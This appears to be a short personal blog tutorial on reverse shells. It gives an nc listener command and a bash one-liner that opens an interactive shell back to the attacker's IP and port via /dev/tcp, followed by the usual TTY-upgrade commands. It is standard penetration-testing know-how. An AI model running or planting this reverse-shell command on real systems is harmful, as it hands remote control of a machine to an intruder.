+++
authors = ["Shengtuo Hu"]
title = "Shell Upgrade"
description = "Upgrade a reverse shell"
date = 2025-08-15T15:24:53-07:00
[taxonomies]
tags = ["Tutorial", "Reverse Shell", "Shell Upgrade"]
[extra]
toc = true
toc_sidebar = true
+++

## Reverse Shell

A reverse shell is initiated from a remote machine and forward to our local port, so we can interact with the remote machine.

```bash
# myip: ip address of the local machine
# myport: local port

# On the local machine
nc -lnvp $myport
# Waiting for the connection

# On the remote machine
bash -i >& /dev/tcp/$myip/$myport 0>&1
```

## Shell Upgrade

After setting up the reverse shell, run the following commands in the reverse shell to get a TTY.

```bash
# Get a TTY
script /dev/null -c bash

# Hit ^Z to send the local `nc` process to the background
# Disable "echo" for the local TTY and bring back `nc` process
stty raw -echo; fg

# Reset the remote shell
reset
# Note that, you won't see anything now, but remember to type in "screen"
```

## References

{{ youtube(id="DqE6DxqJg8Q") }}
